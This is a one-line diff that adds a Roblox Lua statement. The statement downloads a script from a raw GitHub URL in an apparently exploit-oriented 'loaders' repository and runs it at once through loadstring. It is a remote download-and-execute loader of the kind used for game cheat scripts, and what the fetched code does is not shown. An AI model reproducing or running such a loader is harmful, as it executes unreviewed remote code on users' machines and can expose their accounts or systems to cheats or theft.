@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/aura-phonk-edit-tower-spam7-vcweds8po1m129.lua"))()
